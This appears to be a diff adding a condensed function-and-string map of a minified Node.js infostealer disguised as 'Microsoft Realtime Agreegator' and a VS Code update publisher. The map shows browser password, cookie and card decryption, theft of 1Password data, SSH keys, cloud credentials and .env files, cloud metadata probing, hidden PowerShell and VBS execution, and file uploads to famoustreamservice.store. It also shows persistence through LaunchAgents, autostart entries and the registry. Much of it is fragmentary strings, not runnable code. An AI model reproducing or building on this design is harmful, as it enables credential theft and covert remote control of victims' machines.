@@ -1,0 +1,253 @@
+units 455
+h@386 1729B  :: win32 | Microsoft Realtime Agreegator | darwin | AppleAccountSync | unixkernalloader | undefined | ?101:999;const y= | ;const g=h();const w=n.join(t.homedir(),
+Kt@2845 1230B FS,CRYPT :: ;const u=()=>{if(!l){return}try{e.unlinkSync(l)} | };try{e.mkdirSync(w,{recursive:true});l=n.join(w | +process.pid+ | +Date.now()+ | +Math.random().toString(36).slice(2)+ | );e.writeFileSync(l,t, | );const i=s(process.execPath,[l],{stdio:[ | pipe
+finish@4317 787B CRYPT ::   try { process.stdout.write(JSON.stringify(payl |   process.exit(0); | if (!dbPath) { finish({ ok: false, error: 'no_db | else { |   try { |     const db = sqlite3(dbPath, { readonly: true, |     const data = {}; |     for (const q of queries) {
+Ht@5104 261B CRYPT :: sqliteQueryIsolated
+Jt@5434 177B NET :: Backup paused for socket-priority work
+Vt@5611 190B NET :: harvest | Auto-harvest started — backup/FileZilla paused f | started
+Yt@5801 299B  :: Auto-harvest finished | ))}catch(t){}try{hd(t|| | )}catch(t){}It=
+ee@6642 352B NET :: busy | );const n=String(t.message||
+a@7378 428B  :: false
+oe@7806 661B NET :: 
+ie@8467 575B NET :: false
+se@9042 376B  :: );const o=String(e.getUTCDate()).padStart(2, | );const i=String(e.getUTCHours()).padStart(2, | );const s=String(e.getUTCMinutes()).padStart(2, | );const c=String(e.getUTCSeconds()).padStart(2,
+ce@9418 253B  :: string | util | [unprintable]
+ue@9924 467B  :: info | warn | error | debug | function | string
+he@10553 239B FS :: utf8
+De@11726 260B  :: function | ||r.toLowerCase()===
+Ae@11986 181B FS :: utf8
+Le@12167 362B  :: Backup paused (waiting for resume flag)... | Backup resumed | ignore | node-machine-id
+Ie@12573 980B  :: win32 | AppData | Local | client.pid | Microsoft Realtime Agreegator | VScode.Update.Publisher | darwin | .zsh_sessions
+Fe@13651 248B FS :: utf8
+Oe@13899 1036B NET,FS :: --uninstall | utf8 | exit | http://famoustreamservice.store:80/client | websocket | polling
+t@15006 300B  :: )}catch(t){}return}return Ke(e)};process.on( | ,t)});process.on(
+He@15353 304B  :: Socket down — origin refresh via main.js in  | s (picks up published server IP) | function
+ze@15657 10085B FS,CRYPT :: origin-refresh | Origin refresh failed: main.js not found; retry  | )}catch(t){}jt=setTimeout(()=>{jt=null;void ze() | ){jt.unref()}return}try{console.log( | function | connect | disconnect | Socket disconnected (will reconnect):
+cn@26052 656B  :: );const r=String(e|| | );if(!r)return false;if(!r.includes( | );try{return new RegExp(`^${o}$`, | B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816 | );const ln=Buffer.from( | );const un=Buffer.from( | );const fn=Buffer.from( | binary
+dn@26708 608B  :: );if(e.includes( | )||e.includes( | )){return | }if(e.includes( | ))return | ;if(e.includes( | ;return
+Sn@28137 966B  :: );if(!e||e.includes( | chrome.exe | brave.exe | opera.exe | opera_browser.exe | browser.exe | msedge.exe | google-chrome
+vn@29103 300B  :: function
+xn@29403 292B  :: pgrep | ,e],{timeout:5e3,stdio: | });return true}catch(t){}}for(const t of e||[]){ | ,t],{encoding: | ,timeout:5e3,stdio:[ | pipe | ignore
+jn@29695 426B  :: Linux | Windows_NT | tasklist | ,`IMAGENAME eq ${t}`, | ],{encoding:
+Cn@30121 857B  :: Windows_NT | taskkill | ],{windowsHide:true,timeout:15e3,stdio: | });e.push(t)}catch(t){}})}else if(t.type()=== | pkill | ,t],{timeout:1e4,stdio: | });e.push(t)}catch(t){}});n.forEach(t=>{try{o( | })}catch(t){}})}else if(t.type()===
+Dn@31131 796B  :: ignore | pipe | ;let l= | ;let u=false;let f=null;const d=()=>{try{if(proc | &&c.pid){s( | /PID | SIGKILL | data
+An@31927 260B  ::  failed | ;n.stderr=r?r.stderr:
+$n@32434 331B  :: -wal | -shm
+En@32765 465B  :: Windows_NT | 1Password.exe | 1Password.BrowserHelper.exe | tasklist | ,`IMAGENAME eq ${e}`, | ],{encoding: | Darwin | 1Password
+On@33953 549B PROC :: );const r=String(t&&t.stdout|| | +String(t&&t.stderr|| | );const o=(n+ | create | schtasks_system_denied | schtasks_access_denied | schtasks_need_admin | empty_out
+Rn@34502 327B CRYPT :: ;const n=require( | aes-256-gcm | utf8 | }catch(t){return
+Un@34829 308B CRYPT :: crypto | aes-256-gcm
+Kn@35366 1065B CRYPT :: crypto | aes-256-gcm | chacha20-poly1305 | aes-256-cbc
+qn@36431 259B  :: 
+zn@36920 3426B PROC,FS :: );const u=s.replace(/'/g, | );const f=c.replace(/'/g, | );const d=[ | using System; | using System.Runtime.InteropServices; | public class VsDpapi { | ,'  [DllImport( | , SetLastError=true, CharSet=CharSet.Unicode)]',
+Gn@40346 3860B PROC,FS :: ServiceProfiles | LocalService | AppData | Roaming | Microsoft | Crypto | Keys | SystemKeys
+tr@44733 599B  :: ;const o=process.env[ | ;const i=process.env.LOCALAPPDATA|| | ;const s={chrome:[ | ],edge:[ | ],brave:[ | ],opera:[ | ],yandex:[
+er@45332 533B NET,FS :: win32 | /download-abe-payload | arraybuffer
+nr@45865 6220B PROC,FS,CRYPT :: no_app_bound | abe_inject_unsupported_browser | base64 | ascii | APPB | bad_appb_prefix | abe_payload_missing | abe_inject_browser_exe_missing
+rr@52085 4296B PROC,FS,CRYPT :: no_app_bound | base64 | ascii | APPB | bad_appb_prefix | 1FCBE96C-1697-43AF-9140-2897C7C69767 | ielevator_unsupported_browser | in.bin
+or@56381 1121B FS,CRYPT :: no_app_bound | base64 | ascii | APPB | bad_appb_prefix | system_dpapi_failed | @primno/dpapi | CurrentUser
+sr@57741 344B  :: kdewallet | KWallet | kwallet | kwallet-query6 | kwallet-query5 | kwallet-query | ).trim();if(s)return s}catch(t){}}}return
+cr@58085 954B  :: chrome | Chrome Keys | Chrome Safe Storage | Chromium Keys | Chromium Safe Storage | brave | Brave Keys | Brave Safe Storage
+ar@59039 1412B  :: chrome | firefox | )return | ){e.push([ | chrome_libsecret_os_crypt_password_v2 | chrome_libsecret_os_crypt_password_v1 | chromium | chromium_libsecret_os_crypt_password_v2
+lr@60451 3402B CRYPT :: crypto | base64 | utf8 | ){o=o.slice(3)}else if(o.slice(0,5).toString()== | ){o=o.slice(5)}const s=n.pbkdf2Sync(Buffer.from( | saltysalt | sha1 | aes-128-cbc
+gr@64162 818B  :: )};let f= | ;try{if(!t||!r||!e.existsSync(r)){u( | base64 | 'use strict'; | const fs = require('fs'); | const path = require('path'); | const crypto = require('crypto');
+sqliteText@65080 242B CRYPT ::   if (value == null) return '';
+toBlobBuffer@65816 285B  ::   if (p == null) return null; |   if (Buffer.isBuffer(p)) return p; |   if (p instanceof Uint8Array) return Buffer.fro |   if (typeof p === 'string') return Buffer.from( |   try { return Buffer.from(p); } catch (e) { ret
+aesGcmDecrypt@66101 519B CRYPT ::   try { |     if (!buf || !key || buf.length < 31 || key.l |     const iv = buf.slice(3, 15); |     const tag = buf.slice(buf.length - 16); |     const data = buf.slice(15, buf.length - 16); |     const decipher = crypto.createDecipheriv('ae |     decipher.setAuthTag(tag); |     return isSaneSecret(out) ? out : '';
+decryptPassword@66620 3432B FS,CRYPT ::   try { |     const buf = toBlobBuffer(p); |     if (!buf || !buf.length) return ''; |     const prefix = buf.length >= 3 ? buf.slice(0 |     if (prefix === 'v10' || prefix === 'v11' ||  |       return ''; |     try { |       const { Dpapi } = require('@primno/dpapi')
+Sr@70166 378B  :: ,expirationDate:i,hostOnly:!n.startsWith(
+br@70544 322B FS :: 
+kr@70866 526B  :: ;const r=n.length>=3?n.slice(0,3).toString( | ){for(const t of e){const e=Un(n,t);if(!e||!e.le | &&o.length>32){o=o.slice(32)}return o.toString( | )}return | }try{const{Dpapi:t}=require( | );return Buffer.from(t.unprotectData(n,null, | ).toString( | )}catch(t){}return n.toString(
+_r@71392 1111B  :: ,json:[],ok:0,total:0,locked:false}}if(!o.length | ,json:[],ok:0,total:0,locked:false}}const i=awai | );if(i.locked||!i.path){return{text: | ,json:[],ok:0,total:0,locked:true}}let s= | ;const c=[];let a=0;let l=0;try{let t=await Ht(i | ,sql: | }]);let e=t&&t.cookies||[];if(!e.length){t=await | }]);e=t&&t.cookies||[]}if(!e.length){return{text
+vr@72503 682B  :: ,count:0,locked:false}}const r=await br(t,n, | );if(r.locked||!r.path)return{text: | ,count:0,locked:true};let o=[];try{const t=await | ,sql: | }]);const e=t&&t.urls||[];for(const t of e){o.pu | +hn(t.url)+ | title:  | visit_count: 
+xr@73185 1079B  :: ,count:0,locked:false}}const r=await br(t,n, | );if(r.locked||!r.path)return{text: | ,count:0,locked:true};let o=[];try{let t=await H | ,sql: | }]);let e=t&&t.downloads||[];if(!e.length){t=awa | }]);e=t&&t.downloads||[]}for(const t of e){o.pus | +hn(t.target_path)+ | url: 
+jr@74264 298B  :: object | +r:r;if(t.type=== | &&t.url){e.push( | name:  | url:  | date_added: 
+Cr@74562 275B FS :: ,count:0};const n=e.readFileSync(t, | ),count:i.length}}catch(t){return{text:
+Pr@74837 1722B  :: ,cardsCount:0,addressesText: | _vs_webdata_ | cards | }]);const e=t&&t.cards||[];for(const t of e){con | name:  | nickname:  | exp:  | +hn(e.expiration_year)+
+Dr@76559 1124B CRYPT :: false | number | ;let f= | ;try{const i=String(n.basename(o)|| | ).replace(/[<>: | -wal | -shm | string
+Ar@77683 508B  :: string | :c;u+=await Ar(t,r+a+ | ,l,e)}else if(f.isFile()){let e=false;if(s){cons
+Lr@78191 409B  :: _1pass_sync_ | ,n.join(r, | ,o),c);const i=n.join(r, | _1pass_idb_
+$r@78600 2431B  :: Windows_NT | AppData | Local | 1Password | 1Password_desktop_ | Roaming | 1Password_roaming_ | Darwin
+Nr@81031 305B  :: 
+Fr@81336 634B CRYPT :: ;const n=Buffer.from(String(t), | crypto | des-ede3-cbc | utf8 | aes-256-cbc
+Or@81970 2326B CRYPT :: ;try{if(!t||!e.existsSync(t))return null;const o | );if(!o||o.locked||!o.path)return null;r=o.path; | ,sql: | },{name: | priv | SELECT a11 FROM nssPrivate | );const u=Buffer.from(c.item2|| | crypto
+Mr@84296 3549B FS,CRYPT :: ,loginOk:0,cookieText: | ,cookieJson:[],cookieOk:0,historyText: | ,historyOk:0,bookmarksText: | ,bookmarksOk:0,addressesText: | ,addressesOk:0,passwordStatus: | };if(!t||!e.existsSync(t))return o;try{const i=n | );if(e.existsSync(i)){const t=await br(i,r, | );if(!t.locked&&t.path){try{const e=await Ht(t.p
+Rr@87845 424B FS :: ,locked:!t}}catch(t){try{e.unlinkSync(c)}catch(t
+Ur@88269 637B FS,CRYPT :: Profiles | prefs.js | places.sqlite | cookies.sqlite | Default | Profile 
+Jr@89554 516B  :: profiles.ini | Profiles | Local State
+Vr@90070 275B  :: ){const n=String(e|| | ).toLowerCase();let r=String(t|| | ).trim();if(!r){return | }const o=n=== | ;let i=false;if(r.toLowerCase().endsWith( | )){r=r.slice(0,- | .length);i=true}if(o||i){r=r.replace(/[''']/g,
+Zr@90408 851B  :: ).trim();if(!n){return}const r=n.includes( | )?n.split( | ).pop():n;if(r){e.push(r)}};if(process.platform= | home | win32
+Qr@91289 402B  :: darwin | scutil | --get | ComputerName | utf8 | LocalHostName
+no@91691 412B  :: ).trim();let n=String(t|| | ).trim();if(!e){while(n.split( | ).length>1){const t=n.split(
+co@92444 478B  :: 
+ao@92922 1124B FS :: win32 | );const n=parseInt(e[2]|| | ,10);if(n>=22e3)return | ;if(typeof t.version=== | ){const e=t.version();if(/Windows 11/i.test(e))r | ;if(/Windows 10/i.test(e))return | }if(parseInt(e[0]|| | ,10)>=10)return
+mo@94815 368B  :: ){const o=fo(Vr(String(t|| | ).trim(),r),String(n|| | ).trim());const i=String(e|| | ).trim();const s=String(n|| | ).trim();if(!o&&!i&&!s){return | }if(!o&&!i){return s}if(!o){return s?[i,s].filte
+ko@95740 584B  :: function | ).trim(),username:String(t.username|| | ).trim(),customId:String(t.customId!=null?t.cust | ),instanceUsername:String(t.instanceUsername|| | ).trim(),platform:String(t.platform|| | ).trim(),osType:String(t.osType|| | ).trim(),osRelease:String(t.osRelease|| | ).trim(),osVersionLabel:String(t.osVersionLabel|
+Po@96681 313B  :: ).trim()){const t=wo()||ro;if(t){_o(t,t)}}return | ).trim(),osName:String(ao()|| | ).trim(),instanceUsername:String(eo||
+Ao@97130 515B  :: object | ).trim();const n=String(t.city||t.cityName|| | ).trim();const r=String(t.query||t.ip||t.ipAddre | ).toLowerCase()===
+Lo@97645 254B  :: object | ).toLowerCase()=== | ;if(!e){return false}const n=t.mobile===true||t.
+$o@97899 732B NET :: text | http://169.254.169.254/latest/api/token | X-aws-ec2-metadata-token-ttl-seconds | ).trim();if(n){const t=await a.get( | ,{...e,headers:{ | :n}});const r=String(t.data|| | http://169.254.169.254/latest/meta-data/instance | User-Agent
+Eo@98631 215B NET :: text | ).trim()}catch(t){return
+Bo@98846 253B NET :: object
+To@99099 282B  :: http://169.254.169.254/metadata/instance?api-ver | true | object
+Io@99381 1344B  :: ,pcKindCheck: | }}}catch(t){}try{if(await To(t)){return{cloudPro | }}}catch(t){}try{const e=await Eo( | Metadata-Flavor | Google | alibaba | cloud_imds | http://169.254.169.254/opc/v2/instance/
+No@100725 572B NET :: http://ip-api.com/json/ | User-Agent | Node.js Client | success | https://freeipapi.com/api/json | https://ipwho.is/
+Ko@101598 297B  :: object | unknown | ).toLowerCase()=== | ;const r=n?String(e.adDomain|| | ).trim(): | ;const o=String(e.adJoinCheck|| | ).trim()||
+qo@101895 257B  :: ;if(n){return n}}}catch(t){}return
+Go@102263 922B PROC :: SilentlyContinue | $cs = Get-CimInstance Win32_ComputerSystem; | $bios = Get-CimInstance Win32_BIOS; | $joined = [bool]$cs.PartOfDomain; |   adJoined = $joined; |   adDomain = $domain; |   manufacturer = [string]$cs.Manufacturer; |   model = [string]$cs.Model;
+Jo@103185 429B  :: wmic | computersystem | partofdomain,domain | /format:list | utf8 | ;const s=/^true$/i.test(i)||i=== | ;const c=s&&r?String(r[1]).trim(): | ;return{adJoined:s,adDomain:c,adJoinCheck:
+Yo@103860 437B  :: wbinfo | --own-domain | utf8 | --domain-info | winbind
+Zo@104297 777B FS :: sssctl | domain-list | utf8 | /etc/sssd/sssd.conf | sssd | sssd_conf
+Xo@105074 836B  :: win32 | unknown | darwin | ;try{t=o( | -show | utf8 | ;if(!n){return Wo( | )}return{adJoined:true,adDomain:n,adJoinCheck:
+Qo@105910 255B  :: ).trim()&&Oo.adJoinCheck!== | unknown
+ii@106244 345B  :: object | unknown | physical | ).trim().toLowerCase()|| | ;const o=String(e.pcKindCheck|| | ).trim()||
+ci@106804 462B  :: microsoft corporation | virtual | generation
+ai@107266 286B  :: 
+fi@107855 549B  :: 
+mi@108677 483B  :: ).trim().toLowerCase();const n=String(t.biosManu | ).trim().toLowerCase();const r=String(t.systemMo
+gi@109270 351B  :: 
+Ci@110721 2656B PERSIST :: object | ).toLowerCase();const s=si(e);const c=s=== | ;const a=String(n|| | ).trim().toLowerCase();if(f){return{pcKind: | ,hypervisor:f,pcKindCheck:o.cloudProbeCheck|| | ,hypervisor: | ,pcKindCheck:a}}if(e||t){return{pcKind: | ,hypervisor:c?t?
+Pi@113377 108B FS :: utf8
+Di@113485 298B FS,PERSIST :: systemd-detect-virt | utf8 | none | /proc/cpuinfo | }}catch(t){}return
+Ai@113783 254B PERSIST :: sys_vendor | product_name | board_vendor | board_name | bios_vendor | chassis_vendor | product_version | );return{text:e,virt:t||
+Li@114037 362B  :: sysctl | hw.model | utf8 | parallels | none | ].filter(Boolean).join( | ),virt:e,pcKindCheck:
+$i@114399 420B  :: win32_dmi
+Bi@115068 677B  :: win32 | unknown | darwin | })}return oi( | )}if(process.platform=== | ){const t=Ai();return Ci(t.text,t.virt,t.pcKindC
+Ti@115745 318B  :: object | ).trim()&&ti.pcKindCheck!== | &&ti.pcKind!== | unknown
+Ii@116063 3622B NET,FS :: unknown | object | ).trim();if(c&&c!== | ){Object.assign(i,s)}const l=ii(o);const u=Strin | ).trim();if(u&&u!== | ){Object.assign(i,l)}const f=await a.post(b+ | ,{...lo(),...Object.keys(i).length?{ipInfo:i}:{} | application/json
+Ki@119955 258B  :: Darwin | lsof | tcp: | utf8 | SIGKILL
+qi@120213 208B FS :: ;const n=t.tmpDir+ | ;if(!e.existsSync(n))return | ;const o=e.readFileSync(n, | );return o.length>r?o.slice(-r):o}catch(t){retur
+zi@120533 238B NET :: http timeout | error
+Gi@120771 1304B NET :: undefined | )}catch(t){}}if(!o){r(new Error( | WS timeout | CDP timeout:  | string | utf8 | WS error | function
+Ji@122075 597B PROC :: );const r=e=== | ;const o=[];const i=new Set;const s=(t,e)=>{cons | ).trim();if(!n||n=== | );const e=a[2];s(t,e=== | ).toLowerCase()===
+Vi@122672 397B  :: );const r=n.endsWith( | ;const o=await t.send(
+Yi@123069 1296B  :: Runtime.evaluate | window.__hcAb=null | __TOO_LARGE__ | base64
+Zi@124365 1452B  :: brave | Runtime.evaluate | base64
+Qi@125892 1923B  :: brave | );const o=Ji(n, | );if(r.length||o.length){return{dirs:r,files:o}} | );await t.send( | ,{url:r.endsWith( | });await Ui(800);const o=await t.send( | dirs | files
+ts@127815 2186B FS,PERSIST :: Library | LaunchAgents | .plist | launchctl | unload | ignore | --headless | --remote-debugging-port=
+es@130001 415B FS :: launchctl | unload | ignore | .log
+is@130769 259B  :: CURRENT
+ss@131028 939B NET :: ,r);for(const t of c.files){await s(o+ | +t)}}const l=await s( | utf8 | LOCK | .ldb | .log
+cs@131967 532B NET,FS :: );const w=typeof u=== | function
+us@132765 277B  :: indexeddb | _idb_
+ps@133252 571B  :: file:// | /Local%20State | utf8 | ,r);o=e.dirs.filter(t=>t=== | EACCES | EPERM | Default
+hs@133823 622B  :: ext_src_ | Local Extension Settings | extensions | CURRENT
+ys@134634 304B  :: ).trim();if(!o)return;if(await rs(t,e,o))r=true} | .txt | bookmarks- | downloads- | addresses-
+gs@134938 3195B NET,FS,PERSIST :: Darwin | brave | --headless=new | --remote-debugging-port= | --remote-allow-origins=* | --user-data-dir= | --allow-file-access-from-files | --no-first-run
+ws@138133 1292B  :: Default | ,bookmarks: | ,downloads: | ,addresses: | };for(let t=0;t<c.length;t++){const o=c[t];const | );const f=n.join(l, | );if(e.existsSync(u)){await ns(r, | +t,u,u)}if(e.existsSync(f)){await ns(r,
+Ss@139425 33404B NET,PROC,FS :: logins | cookies | ;const l=a=== | ;const u=a=== | Auto-harvest content-upload failed:  | Darwin | function | Linux
+Rc@172829 1243B  :: Default | ),10);u=Number.isFinite(t)&&t>0?t:a+1}await Rc(n | ,r,s);if(Je.has(t)){await Rc(n.join(i,l, | _1pass_sync_ | ,r,s)}const f=n.join(i,l, | _idb_ | getExtensionData
+na@174812 1431B PROC,FS :: Linux | /proc/net/dev | utf8 | )){const t=e.trim();if(!t||t.includes( | )||!t.includes( | ))continue;const o=t.indexOf( | Darwin | netstat
+ra@176243 585B  :: 
+oa@176828 220B NET :: function | pc_perf
+ia@177048 1217B NET :: function | ).map(([t,e])=>`${t}=${e}`).join( | );console.log(`[SS-UPD] ${t}${n?` | ${n}`:
+da@178265 391B FS :: linux | /mnt | wslg | function
+pa@178656 4550B NET :: Running env search before main backup... | e-backup | Windows_NT | .charCodeAt(0);t<= | .charCodeAt(0);t++){if(zc(n))break;await Le();co | ;if(!e.existsSync(r)){continue}await fa(r, | ,n)}}if(process.platform=== | ){for(const t of da()){if(zc(n))break;await Le()
+xa@183663 207B FS :: nvidiadrivers.zip | nvidia-drivers
+Ca@183993 218B FS :: 
+Pa@184211 292B FS :: client32.ini | payload | Service.exe
+Aa@184634 194B FS :: utf8 | Filename= | );e.writeFileSync(t,r,
+La@184828 466B PROC :: ).replace(/'/g, | );if(!e){return}try{o( | -NoProfile | -WindowStyle | Hidden | -ExecutionPolicy | Bypass | -Command
+$a@185294 366B  :: win32 | }try{const e=o(_a(),[ | ,String(t)],{encoding: | ,windowsHide:true,timeout:15e3,stdio:[ | pipe | ignore | ).trim()}}}catch(t){}return
+Ta@185906 262B  :: 
+Ia@186168 397B PROC,FS :: ResCache.vbs | ');const l=[ | ,'Set sh = CreateObject( | )','sh.CurrentDirectory =  | ','sh.Run Chr(34) &  |  & Chr(34), 0, False'].join( | );e.writeFileSync(s,l, | );const u='wscript.exe 
+Na@186565 405B NET :: stream | download failed: HTTP  | finish | error
+Fa@186970 213B PROC :: +n.join( | ;const i=` | ${r}`;const s=process.env.ComSpec|| | ,i],{windowsHide:true,timeout:3e5,stdio:
+Oa@187183 198B FS :: deploy-manifest.json | utf8
+Ma@187381 731B FS :: deploy-manifest.json | utf8 | installDir is empty | client32.ini | cksini.exe | ignore
+Ra@188112 341B PROC,FS :: win32 | cmd.exe | ping -n 3 127.0.0.1 >nul | ignore | function
+Ua@188453 1068B PROC :: win32 | TakePC is available for Windows instances only | TakePC already in progress | vs_takepc_ | +Date.now());const i=n.join(r, | );const s=n.join(r, | );let c=false;try{e.mkdirSync(s,{recursive:true} | -NoProfile
+Wa@189521 230B FS :: win32 | nsm-run.cmd | ).toLowerCase().indexOf(
+qa@189782 252B  :: win32 | darwin | .zsh_sessions | Cache | .local | share | agent
+Za@190422 330B PROC :: $p = Get-CimInstance Win32_Process -ErrorAction  | | Where-Object { | | Select-Object -First 1; | if ($p) { exit 0 } else { exit 1 } | -NoProfile | -NonInteractive | -ExecutionPolicy | Bypass
+Xa@190752 349B  :: win32 | pgrep | ,e],Ee);return true}catch(e){try{o( | ,t],Ee);return true}catch(t){}try{o(
+tl@191167 373B PROC :: taskkill | /PID | Get-CimInstance Win32_Process -ErrorAction Silen | | Where-Object { | | ForEach-Object { | Stop-Process -Id $_.ProcessId -Force -ErrorActio | ].join( | -NoProfile
+el@191540 251B  :: SIGKILL | pkill
+rl@191909 1234B FS :: ;const i={...process.env,HOME:t.homedir(),USER:o | ,LOGNAME:o||process.env.LOGNAME|| | ,KEYBOARD_AGENT_QUIET: | ,KEYBOARD_AGENT_NO_AUTO_START: | };if(process.platform=== | node_modules | linux | function
+ol@193143 518B  :: 
+il@193661 93B FS :: 
+cl@193920 66B FS :: 
+ll@194010 80B FS :: 
+yl@194593 828B NET,FS :: X-Client-OS | X-Client-Arch | finish | darwin | error | timeout
+gl@195421 505B NET :: data | error | timeout
+bl@196223 307B  :: try { | function |     main().catch(function (err) { |       console.error(err); |       process.exit(1); | } catch (err) { |   console.error(err); |   process.exit(1);
+kl@196530 296B  :: stdin unavailable | drain | error
+_l@196826 604B  :: win32 | ,M,...nl()],{windowsHide:true,shell:false,detach | ignore | error | exit
+vl@197430 614B  :: win32 | darwin | linux
+jl@198093 450B  :: win32 | darwin
+Ll@198794 596B  :: ).trim();const i=String(r|| | ).trim();if(!o||o=== | ||qs(o)){if(qs(o)){return | ){if(!i||qs(i)){return t.type()=== | ::my-computer | Windows_NT
+El@199596 357B  :: 
+Tl@200082 302B  :: ).toLowerCase();if(n=== | ){return true}if(n===
+Ml@200752 375B  :: extension | extensions | sync extension settings | extension rules | extension scripts | extension state
+Zl@201530 359B  :: filesystem timeout | ETIMEDOUT | function
+Ql@202042 298B  :: 
+tu@202340 519B  :: 
+eu@202859 1168B  :: 
+nu@204027 828B  :: );const r=String(e.name|| | );const o=n.startsWith( | );const i=r.startsWith( | base | ::big-files
+lu@205005 983B  :: 
+uu@205988 22942B NET,FS,CRYPT,PERSIST :: win32 | ::my-computer | .config | gcloud | .aws | .azure | .ssh | reconnect
+vu@229045 308B  :: [FileZilla] 5 min work window reached â€” sleepi
+xu@229353 311B NET :: ){return true}if(e===
+Cu@229827 578B  :: ).toLowerCase();if(!e)return false;if(e.includes | )||e.includes( | )){return true}const n=Qe.some(t=>{const n=Strin | ).toLowerCase();return n&&(e===n||e.startsWith(n | ).toLowerCase();return n&&(e.includes( | )||e.endsWith(
+Au@230851 632B  :: );const n=e.toLowerCase();const r=n.split( | ).filter(Boolean);const o=r[r.length-1]|| | ;return pu.excludePatterns.some(t=>{const i=Stri | );if(i.includes( | );return t.test(e)}catch(t){return n.includes(s) | )){return r.some(t=>t===s)||o.endsWith(s)}if(s.i | )){const t=s.split(
+Lu@231483 543B  :: win32 | appdata | application data | contacts | favorites | links | music | pictures
+Eu@232273 142B FS :: 
+Bu@232415 1033B FS :: ).trim();if(!e)return;try{r.push(n.resolve(e))}c | OneDrive | MEGA | MEGAsync | Mega | OneDriveConsumer | OneDriveCommercial | win32
+Tu@233448 263B  :: win32 | }return n.resolve(t)}const t=process.env.HOME||( | +process.env.USER: | );if(!t||!e.existsSync(t)){return
+Iu@233711 410B FS :: function
+Nu@234121 2184B FS :: win32 | Warning: Could not determine user profile path | Desktop | Documents | Downloads | .charCodeAt(0);r<= | .charCodeAt(0);r++){const o=String.fromCharCode( | ;const i=o+
+Fu@236305 905B  :: function | win32 | proc | boot | root | SYSTEM VOLUME INFORMATION | $RECYCLE.BIN | RECYCLER
+Mu@237210 1020B  :: .env | .env. | env.example | .env.example | config | config. | .config | config.json
+Wu@238377 525B NET :: darwin | /check | HEAD | X-File-Path | X-File-Size | data | ,()=>{e(t.statusCode===200)})});ve(o);o.on( | ,()=>{e(false)});o.on(
+Ku@238902 530B NET :: /status | ).trim();if(n){e.searchParams.set( | ,headers:ju(),timeout:5e3,agent:_u()},e=>{let n= | ,t=>{n+=t.toString()});e.on( | error | timeout
+qu@239432 794B NET :: /complete | POST | Content-Type | application/json | Content-Length | ,t=>{n+=t.toString()});e.on( | error | timeout
+Hu@240226 578B NET :: /complete/reset | POST | Content-Type | application/json | Content-Length | ,t=>{n+=t.toString()});e.on( | ,()=>{t(e.statusCode===200)})});ve(o);o.on( | ,()=>t(false));o.on(
+Gu@240886 2928B NET,FS :: skipped: browser extension path | skipped: blocked extension | darwin | cannot access file:  | file too large | /upload | POST | X-File-Path
+Vu@244013 426B NET :: Upload did not complete
+c@244515 536B NET :: darwin
+Zu@245051 1384B NET :: Starting backup... | File size limit: 10MB | );if(!t){const t=await Ku();if(t){console.log( | );console.log( | );pt=true;he(true);return}}else{console.log( | )}he(false);pt=false;console.log( | Error: No allowed directories found. Exiting. | (none)
+d@246435 363B NET :: 
+m@247104 1949B NET :: .repeat(60)}`);console.log( | );const k=await qu();if(k){console.log( | );pt=true;he(true)}else{console.log( | );pt=false;he(false)}}const Xu=require(
+of@249053 80B PROC :: 
+sf@249133 67B FS :: 
+cf@249200 1074B PROC,FS :: win32 | ');const i=[ | WScript.Sleep 3000 | Scripting.FileSystemObject | fso.DeleteFile WScript.ScriptFullName, True | utf8 | ;const a=n.join(c, | wscript.exe
+lf@250336 52B PERSIST :: query
+hf@250736 112B PROC,PERSIST :: REG_SZ
+mf@250848 305B  :: delete | ])}sf(uf());sf(n.join(ef, | ));sf(df());sf(pf());try{sf(n.join(ff(), | ));sf(n.join(ff(),
+bf@251448 85B PERSIST :: Library | LaunchAgents | com. | .plist
+xf@251834 242B FS :: utf8 | <string>/bin/sh</string> | <string> | </string>
+Df@252234 578B PROC :: /opt/homebrew/bin/node | /usr/local/bin/node | /usr/bin/node | /usr/bin/which | node | utf8 | ignore | pipe
+Af@252812 862B FS ::  encoding= | ?>','<!DOCTYPE plist PUBLIC  | http://www.apple.com/DTDs/PropertyList-1.0.dtd | <dict> |     <key>CFBundleExecutable</key> |     <string> | </string> |     <key>CFBundleIdentifier</key>
+Lf@253674 475B FS,PERSIST :: Contents | MacOS | Info.plist | #!/bin/sh | NODE= | MAIN= |  -gt 0 ]; then','  exec  | ,'exec 
+Ef@254352 940B FS ::         <string> | </string> |  encoding= | ?>','<!DOCTYPE plist PUBLIC  | http://www.apple.com/DTDs/PropertyList-1.0.dtd | <dict> |     <key>Label</key> |     <string>
+Bf@255292 140B FS :: 
+Tf@255432 77B PERSIST :: .config | autostart | .desktop
+Nf@255549 214B FS :: [Desktop Entry] | Type=Application | Name= | Path= | X-GNOME-Autostart-enabled=true | );af(n.dirname(Tf()));e.writeFileSync(Tf(),t,{en
+Hf@256161 541B  :: Auto-start: after harvest or 3 minutes | function | scheduleMacAutostartInstall
+Zf@257032 752B FS :: darwin | Library | Logs | keyboard-agent- | .log | linux | .local | state
+Xf@257784 147B FS :: utf8
+Qf@257931 381B FS :: win32 | AppData | Local | Microsoft | RealPrior | Cache
+td@258312 428B PERSIST :: darwin | object | Library | LaunchAgents | .plist | launchctl | unload | ignore
+ed@258740 208B FS :: ssh_askpass_ | ;const i= | +process.pid+
+nd@258948 307B  :: darwin | Library | Logs | AppSyncRecording.log | linux | .cache | AppData | Local
+rd@259255 169B FS :: function
+od@259424 1144B  :: main.vbs | main.js | launch.ps1 | win32 | Microsoft Realtime Agreegator.cmd | Microsoft Realtime Agreegator.vbs | AppData | Local
+sd@260615 164B NET :: Manual upload started — backup yielding FileZill
+cd@260779 177B NET :: manual-upload-done | Manual upload finished — backup resume scheduled
+ad@260956 283B  :: Backup pause flag set (manual) â€” FileZilla abo | Backup pause flag set â€” FileZilla aborting imm | pause
+ud@261418 438B NET :: Backup resume skipped (manual pause active) | Backup resume skipped (socket-priority work acti | socket-priority-work | Backup pause flag cleared
+fd@261856 496B  :: Backup resume: child still running, pause flag c | Backup resume: starting forced child run | Backup resume: starting child (was not running)
+pd@262399 418B  :: function
+hd@262817 789B NET :: Backup resume deferred (socket-priority work act | ))}catch(t){}mt=setTimeout(()=>{mt=null;hd(t|| | )},3e4);if(mt&&typeof mt.unref=== | )+(e>0?` backoff=${e}`: | ))}catch(t){}mt=setTimeout(()=>{mt=null;if(ht){r | );return}if(!Me||!Me.connected){try{console.log( | )}catch(t){}hd( | );return}ud();wd(
+md@263606 690B NET :: socket-priority-work | resumed
